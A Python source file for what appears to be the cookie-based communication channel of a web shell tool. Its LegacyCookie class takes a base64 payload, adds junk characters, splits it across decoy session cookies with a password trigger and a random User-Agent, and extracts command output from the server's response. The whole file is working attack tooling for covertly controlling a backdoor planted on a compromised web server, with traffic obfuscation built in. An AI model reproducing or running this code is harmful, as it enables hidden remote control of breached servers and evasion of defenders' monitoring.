from core.loggers import dlog, log
from core import config
import re
import urlparse
import random
import utils
import string
import base64
import urllib2

class LegacyCookie:

    def __init__(self, url, password):

        self.url = url
        self.password = password
        self.extractor = re.compile(
            "<%s>(.*)</%s>" % (
                self.password[2:],
                self.password[2:]
            ),
            re.DOTALL
        )

        self.parsed = urlparse.urlparse(self.url)
        self.data = None

        if not self.parsed.path:
            self.query = self.parsed.netloc.replace('/', ' ')
        else:
            self.query = ''.join(
                    self.parsed.path.split('.')[:-1]
                ).replace('/', ' ')

        self.default_prefixes = [
            "ID", "SID", "APISID",
            "USRID", "SESSID", "SESS",
            "SSID", "USR", "PREF"
        ]

        random.shuffle(self.default_prefixes)

        # Load agents
        self.agents = utils.http.load_all_agents()

        # Init additional headers list
        self.additional_headers = config.additional_headers

    def send(self, original_payload, additional_handlers = []):

        payload = base64.b64encode(original_payload.strip())
        length = len(payload)
        third = length / 3
        thirds = third * 2

        prefixes = self.default_prefixes[:]
        cookie_payload_string = ''

        # Add random cookies before payload
        while len(prefixes) > 3 and len(prefixes) > 4:
            if random.random() > 0.5:
                break
            cookie_payload_string += (
                prefixes.pop()
                + '='
                + utils.strings.randstr(16, False, string.letters + string.digits)
                + '; '
            )

        # DO NOT fuzz with %, _ (\w on regexp keep _)
        payload = utils.strings.pollute(
            data = payload,
            charset = '#&*-/?@~'
        )

        cookie_payload_string += prefixes.pop() + '=' + payload[:third] + '; '
        cookie_payload_string += prefixes.pop() + '=' + payload[third:thirds] + '; '
        cookie_payload_string += prefixes.pop() + '=' + payload[thirds:]

        opener = urllib2.build_opener(*additional_handlers)

        # When core.conf contains additional cookies, carefully merge
        # the new cookies and UA and add all the other headers
        additional_headers = []
        additional_ua = ''
        additional_cookie = ''
        for h in self.additional_headers:
            if h[0].lower() == 'cookie' and h[1]:
                additional_cookie = ' %s;' % h[1].strip(';')
            elif h[0].lower() == 'user-agent' and h[1]:
                additional_ua = h[1]
            else:
                additional_headers.append(h)


        additional_headers.append(
            ('User-Agent',
                (additional_ua if additional_ua else random.choice(self.agents))
            )
        )

        # If user cookies are specified, insert them between the first
        # (the trigger) and the lastest three (the splitted payload)
        additional_headers.append(
            ('Cookie', '%s=%s;%s %s' % (
                            prefixes.pop(),
                            self.password[:2],
                            additional_cookie if additional_cookie else '',
                            cookie_payload_string
                        )
            )
        )

        opener.addheaders  = additional_headers
        dlog.debug(
            '[H]\n%s' %
            ('\n'.join('> %s: %s' % (h[0], h[1]) for h in additional_headers))
        )

        url = (
            self.url if not config.add_random_param_nocache
            else utils.http.add_random_url_param(self.url)
        )

        response = opener.open(url).read()

        if not response:
            return

        data = self.extractor.findall(response)

        if not data or len(data) < 1:
            return

        return data[0].strip()
